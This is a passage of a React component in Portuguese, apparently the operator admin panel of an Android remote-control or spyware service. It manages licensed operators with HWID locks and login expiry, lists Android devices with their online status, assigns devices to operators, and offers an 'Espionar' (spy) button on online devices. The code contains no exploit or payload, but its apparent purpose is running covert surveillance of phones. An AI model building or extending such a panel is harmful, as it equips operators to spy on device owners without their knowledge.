          <div className="flex space-x-2">
            <button
              onClick={loadData}
              className="flex items-center space-x-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Atualizar</span>
            </button>
            {activeTab === 'users' && (
              <button
                onClick={() => setShowCreateModal(true)}
                className="flex items-center space-x-2 px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors"
              >
                <UserPlus className="w-4 h-4" />
                <span>Novo Usuário</span>
              </button>
            )}
          </div>
        </div>

        {/* Conteúdo - Usuários */}
        {activeTab === 'users' && (
          <div className="bg-[#440e05]/50 rounded-lg border border-blue-500/20 overflow-hidden">
            <table className="w-full">
              <thead className="bg-[#290903]/50">
                <tr>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Usuário</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Status</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">HWID</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">2FA (Google)</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Dispositivos</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Último Acesso</th>
                  <th className="px-4 py-3 text-right text-xs font-semibold text-gray-400 uppercase">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                {filteredUsers.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-12 text-center text-gray-400">
                      <Users className="w-12 h-12 mx-auto mb-3 text-slate-500/50" />
                      <p className="text-base font-semibold">Nenhum usuário cadastrado ou encontrado</p>
                      <p className="text-xs text-gray-500 mt-1">Clique em "Novo Usuário" para cadastrar um operador ou clique em Atualizar</p>
                    </td>
                  </tr>
                ) : (
                  filteredUsers.map((user) => (
                  <tr key={user.id} className="hover:bg-slate-700/30">
                    <td className="px-4 py-3">
                      <div>
                        <p className="font-semibold text-white flex items-center">
                          {user.username}
                          {user.is_admin && (
                            <span className="ml-2 px-2 py-0.5 bg-red-600 text-white text-xs rounded">ADMIN</span>
                          )}
                        </p>
                        <p className="text-xs text-gray-400">{user.email}</p>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      {user.is_banned ? (
                        <span className="px-2 py-1 bg-red-500/20 text-red-400 text-xs rounded-full">🚫 Banido</span>
                      ) : user.is_active ? (
                        <div className="flex flex-col gap-1">
                          <span className="px-2 py-1 bg-green-500/20 text-green-400 text-xs rounded-full w-fit">✅ Ativo</span>
                          {user.expires_at ? (
                            new Date(user.expires_at) < new Date() ? (
                              <span className="px-2 py-0.5 bg-red-600/30 text-red-300 text-[10px] font-bold rounded-full w-fit">🔴 EXPIRADO ({new Date(user.expires_at).toLocaleDateString('pt-BR')})</span>
                            ) : (
                              <span className="px-2 py-0.5 bg-cyan-500/20 text-cyan-300 text-[10px] rounded-full w-fit">⏳ Expira em {new Date(user.expires_at).toLocaleDateString('pt-BR')}</span>
                            )
                          ) : (
                            <span className="text-[10px] text-gray-500 italic">Sem expiração</span>
                          )}
                        </div>
                      ) : (
                        <span className="px-2 py-1 bg-gray-500/20 text-gray-400 text-xs rounded-full">⏸️ Inativo</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      {user.hwid ? (
                        <div className="flex items-center space-x-2">
                          <span className="text-xs font-mono text-green-400 bg-green-500/10 px-2 py-1 rounded">
                            {user.hwid.substring(0, 12)}...
                          </span>
                          <button
                            onClick={() => handleResetHwid(user.id)}
                            className="p-1 text-yellow-400 hover:bg-yellow-500/20 rounded"
                            title="Resetar HWID"
                          >
                            <RefreshCw className="w-3 h-3" />
                          </button>
                        </div>
                      ) : (
                        <span className="text-xs text-gray-500">Não ativado</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      {user.totp_enabled ? (
                        <div className="flex items-center space-x-1.5">
                          <span className="text-xs font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded-full flex items-center gap-1">
                            <ShieldCheck className="w-3 h-3 text-emerald-400" />
                            <span>Ativo</span>
                          </span>
                          <button
                            onClick={() => handleReset2FA(user.id)}
                            className="p-1 text-yellow-400 hover:bg-yellow-500/20 rounded transition-colors"
                            title="Resetar Google Authenticator (2FA)"
                          >
                            <RefreshCw className="w-3 h-3" />
                          </button>
                        </div>
                      ) : (
                        <span className="text-xs text-gray-400 bg-slate-800/80 border border-slate-700 px-2 py-0.5 rounded-full">Pendente</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      <span className="text-white font-semibold">{user.device_count}</span>
                    </td>
                    <td className="px-4 py-3">
                      <div>
                        <p className="text-xs text-gray-300">
                          {user.last_login ? new Date(user.last_login).toLocaleString() : 'Nunca'}
                        </p>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-right">
                      <div className="flex items-center justify-end space-x-1">
                        <button
                          onClick={() => {
                            setEditingUser(user);
                            setEditForm({
                              email: user.email,
                              password: '',
                              notes: user.notes || '',
                              is_admin: user.is_admin,
                              expiration_days: 0,
                              clear_expiration: false
                            });
                          }}
                          className="p-2 text-blue-400 hover:bg-blue-500/20 rounded"
                          title="Editar"
                        >
                          <Edit className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => handleBanUser(user.id, user.is_banned)}
                          className={`p-2 rounded ${user.is_banned ? 'text-green-400 hover:bg-green-500/20' : 'text-yellow-400 hover:bg-yellow-500/20'}`}
                          title={user.is_banned ? 'Desbanir' : 'Banir'}
                        >
                          <Ban className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => handleDeleteUser(user.id)}
                          className="p-2 text-red-400 hover:bg-red-500/20 rounded"
                          title="Excluir"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                )))}
              </tbody>
            </table>
          </div>
        )}

        {/* Conteúdo - Dispositivos */}
        {activeTab === 'devices' && (
          <div className="bg-[#440e05]/50 rounded-lg border border-blue-500/20 overflow-hidden">
            <table className="w-full">
              <thead className="bg-[#290903]/50">
                <tr>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Dispositivo</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Status</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Operador</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Último Acesso</th>
                  <th className="px-4 py-3 text-right text-xs font-semibold text-gray-400 uppercase">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                {filteredDevices.map((device) => (
                  <tr key={device.id} className="hover:bg-slate-700/30">
                    <td className="px-4 py-3">
                      <div>
                        <p className="font-semibold text-white">{device.model || 'Desconhecido'}</p>
                        <p className="text-xs text-gray-400">{device.device_id.substring(0, 16)}...</p>
                        <p className="text-xs text-gray-500">{device.manufacturer} • Android {device.android_version}</p>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      {device.is_online ? (
                        <span className="px-2 py-1 bg-green-500/20 text-green-400 text-xs rounded-full flex items-center w-fit">
                          <span className="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></span>
                          Online
                        </span>
                      ) : (
                        <span className="px-2 py-1 bg-gray-500/20 text-gray-400 text-xs rounded-full">Offline</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      {device.owner_username ? (
                        <div className="flex items-center space-x-2">
                          <span className="px-2 py-1 bg-blue-500/20 text-blue-400 text-xs rounded flex items-center">
                            <User className="w-3 h-3 mr-1" />
                            {device.owner_username}
                          </span>
                          <button
                            onClick={() => handleUnassignDevice(device.device_id)}
                            className="p-1 text-red-400 hover:bg-red-500/20 rounded"
                            title="Remover"
                          >
                            <Unlink className="w-3 h-3" />
                          </button>
                        </div>
                      ) : (
                        <span className="text-xs text-gray-500 italic">Não atribuído</span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      <p className="text-xs text-gray-300">
                        {device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Nunca'}
                      </p>
                    </td>
                    <td className="px-4 py-3 text-right">
                      <div className="flex items-center justify-end space-x-2">
                        {device.is_online && (
                          <button
                            onClick={() => setSpyingDevice(device)}
                            className="flex items-center space-x-1 px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white text-xs rounded transition-colors"
                          >
                            <Eye className="w-3 h-3" />
                            <span>Espionar</span>
                          </button>
                        )}
                        <button
                          onClick={() => {
                            setAssigningDevice(device);
                            setSelectedUserId(device.owner_id);
                          }}
                          className="flex items-center space-x-1 px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs rounded transition-colors"
                        >
                          <Link className="w-3 h-3" />
                          <span>Atribuir</span>
                        </button>

                        <button
                          onClick={async () => {
                            if (confirm(`Deseja realmente excluir o dispositivo "${device.model || device.device_id}"?`)) {
                              try {
                                await devicesAPI.deleteDevice(device.device_id);
                                setSuccess("Dispositivo excluído!");
                                loadData();
                              } catch (err: any) {
                                setError(err.response?.data?.detail || "Erro ao excluir dispositivo");
                              }
                            }
                          }}
                          className="flex items-center space-x-1 px-3 py-1.5 bg-red-600/80 hover:bg-red-700 text-white text-xs rounded transition-colors"
                          title="Excluir dispositivo"
                        >
                          <Trash2 className="w-3 h-3" />
                          <span>Excluir</span>
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Modal Criar Usuário */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-[#440e05] rounded-lg p-6 w-full max-w-md mx-4">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center">
              <UserPlus className="w-5 h-5 mr-2 text-green-400" />
              Criar Novo Usuário
            </h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-400 mb-1">Usuário</label>
                <input
                  type="text"
                  value={newUser.username}
                  onChange={(e) => setNewUser({ ...newUser, username: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                  placeholder="nome_usuario"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">E-mail</label>
                <input
                  type="email"
                  value={newUser.email}
                  onChange={(e) => setNewUser({ ...newUser, email: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                  placeholder="email@exemplo.com"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Senha</label>
                <input
                  type="password"
                  value={newUser.password}
                  onChange={(e) => setNewUser({ ...newUser, password: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                  placeholder="********"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Validade do Login (Expiração)</label>
                <select
                  value={newUser.expiration_days}
                  onChange={(e) => setNewUser({ ...newUser, expiration_days: parseInt(e.target.value) })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                >
                  <option value={0}>Sem expiração (Vitalício)</option>
                  <option value={1}>1 Dia</option>
                  <option value={7}>7 Dias</option>
                  <option value={15}>15 Dias</option>
                  <option value={30}>30 Dias</option>
                  <option value={60}>60 Dias</option>
                  <option value={90}>90 Dias</option>
                  <option value={365}>1 Ano</option>
                </select>
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Notas</label>
                <textarea
                  value={newUser.notes}
                  onChange={(e) => setNewUser({ ...newUser, notes: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                  rows={2}
                />
              </div>
              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="is_admin"
                  checked={newUser.is_admin}
                  onChange={(e) => setNewUser({ ...newUser, is_admin: e.target.checked })}
                  className="mr-2"
                />
                <label htmlFor="is_admin" className="text-sm text-gray-300">É administrador</label>
              </div>
            </div>
            <div className="flex space-x-3 mt-6">
              <button
                onClick={() => setShowCreateModal(false)}
                className="flex-1 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded"
              >
                Cancelar
              </button>
              <button
                onClick={handleCreateUser}
                className="flex-1 py-2 bg-green-600 hover:bg-green-700 text-white rounded"
              >
                Criar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal Editar Usuário */}
      {editingUser && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-[#440e05] rounded-lg p-6 w-full max-w-md mx-4">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center">
              <Edit className="w-5 h-5 mr-2 text-blue-400" />
              Editar: {editingUser.username}
            </h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-400 mb-1">E-mail</label>
                <input
                  type="email"
                  value={editForm.email}
                  onChange={(e) => setEditForm({ ...editForm, email: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Nova Senha</label>
                <input
                  type="password"
                  value={editForm.password}
                  onChange={(e) => setEditForm({ ...editForm, password: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                  placeholder="Deixe vazio para manter"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Adicionar / Alterar Tempo de Expiração</label>
                <select
                  value={editForm.expiration_days}
                  onChange={(e) => setEditForm({ ...editForm, expiration_days: parseInt(e.target.value), clear_expiration: false })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white mb-2"
                >
                  <option value={0}>Manter expiração atual</option>
                  <option value={1}>Mais 1 Dia (a partir de hoje)</option>
                  <option value={7}>Mais 7 Dias (a partir de hoje)</option>
                  <option value={15}>Mais 15 Dias (a partir de hoje)</option>
                  <option value={30}>Mais 30 Dias (a partir de hoje)</option>
                  <option value={60}>Mais 60 Dias (a partir de hoje)</option>
                  <option value={90}>Mais 90 Dias (a partir de today)</option>
                  <option value={365}>Mais 1 Ano (a partir de hoje)</option>
                </select>
                {editingUser?.expires_at && (
                  <div className="flex items-center mt-1">
                    <input
                      type="checkbox"
                      id="clear_exp"
                      checked={editForm.clear_expiration}
                      onChange={(e) => setEditForm({ ...editForm, clear_expiration: e.target.checked, expiration_days: 0 })}
                      className="mr-2"
                    />
                    <label htmlFor="clear_exp" className="text-xs text-yellow-300">Remover expiração (Tornar sem limite)</label>
                  </div>
                )}
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Notas</label>
                <textarea
                  value={editForm.notes}
                  onChange={(e) => setEditForm({ ...editForm, notes: e.target.value })}
                  className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
                  rows={2}
                />
              </div>
              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="edit_is_admin"
                  checked={editForm.is_admin}
                  onChange={(e) => setEditForm({ ...editForm, is_admin: e.target.checked })}
                  className="mr-2"
                />
                <label htmlFor="edit_is_admin" className="text-sm text-gray-300">É administrador</label>
              </div>
            </div>
            <div className="flex space-x-3 mt-6">
              <button
                onClick={() => setEditingUser(null)}
                className="flex-1 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded"
              >
                Cancelar
              </button>
              <button
                onClick={handleUpdateUser}
                className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded"
              >
                Salvar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal Atribuir Dispositivo */}
      {assigningDevice && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-[#440e05] rounded-lg p-6 w-full max-w-md mx-4">
            <h2 className="text-xl font-bold text-white mb-4 flex items-center">
              <Link className="w-5 h-5 mr-2 text-blue-400" />
              Atribuir Dispositivo
            </h2>
            <div className="mb-4">
              <p className="text-gray-400 text-sm mb-2">Dispositivo:</p>
              <div className="bg-slate-700 rounded p-3">
                <p className="text-white font-semibold">{assigningDevice.model || 'Desconhecido'}</p>
                <p className="text-xs text-gray-400">{assigningDevice.device_id}</p>
              </div>
            </div>
            <div className="mb-4">
              <label className="block text-sm text-gray-400 mb-2">Selecione o usuário:</label>
              <select
                value={selectedUserId || ''}
                onChange={(e) => setSelectedUserId(e.target.value ? parseInt(e.target.value) : null)}
                className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white"
              >
                <option value="">-- Selecione --</option>
                {users.map(user => (
                  <option key={user.id} value={user.id}>
                    {user.username} ({user.email}) {user.is_admin ? '[Admin]' : ''}
                  </option>
                ))}
              </select>
            </div>
            <div className="flex space-x-3">
              <button
                onClick={() => {
                  setAssigningDevice(null);
                  setSelectedUserId(null);
                }}
                className="flex-1 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded"
              >
                Cancelar
              </button>
              <button
                onClick={handleAssignDevice}
                disabled={!selectedUserId}
                className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded disabled:opacity-50"
              >
                Atribuir
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
